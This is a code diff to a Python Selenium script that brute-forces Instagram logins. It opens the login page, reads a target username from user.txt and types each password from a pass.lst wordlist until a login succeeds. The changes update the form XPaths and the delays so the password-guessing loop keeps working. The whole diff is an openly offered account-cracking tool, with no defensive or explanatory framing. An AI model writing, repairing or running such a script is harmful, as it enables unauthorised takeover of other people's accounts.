@@ -9,24 +9,23 @@ driver.get("https://www.instagram.com")
 time.sleep(2)
 
 
-# get boxes then try pass.txt if succes y'll redirect into the homepage xD
+# get tags then try pass.txt if succes y'll get redirect into the homepage xD
 username = driver.find_element_by_name('username')
 password = driver.find_element_by_name('password')
 nologin = driver.find_element_by_xpath(
-    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]')
+    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[1]/div[3]/button')
 login = driver.find_element_by_xpath(
-    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]')
+    '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[1]/div[3]/button')
 user_txt = open('user.txt', 'r')
 for line2 in user_txt:
     username.send_keys(line2)
-    time.sleep(1)
+    time.sleep(2)
     break
 pass_lst = open('pass.lst', 'r')
 
 for line in pass_lst:
-    time.sleep(1)
     password.send_keys(Keys.CONTROL, 'a')
-    time.sleep(1)
+    time.sleep(2)
     password.send_keys(line)
     login.click()
     time.sleep(1)
